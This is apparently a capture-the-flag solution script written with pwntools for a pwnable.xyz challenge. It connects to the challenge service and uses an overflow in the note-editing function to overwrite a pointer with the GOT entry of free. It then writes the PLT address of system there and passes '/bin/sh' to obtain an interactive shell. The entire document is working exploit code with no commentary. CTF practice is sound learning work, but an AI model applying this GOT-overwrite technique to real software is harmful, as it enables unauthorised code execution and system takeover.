from pwn import *

###Util
def edit_note(size,data):
    r.sendlineafter('> ','1')
    r.sendlineafter('len? ',str(size))
    r.sendafter('note: ',data)


def edit_desc(data):
    r.sendlineafter('> ','2')
    r.sendafter('desc: ',data)

###Addr
free_got =  0x601210
system_plt = 0x400750

###Exploit
r = remote('svc.pwnable.xyz',30016)
edit_note(0x28,b'a'*0x20+p64(free_got))
edit_desc(p64(system_plt))
edit_note(8,'/bin/sh\x00')
r.interactive()
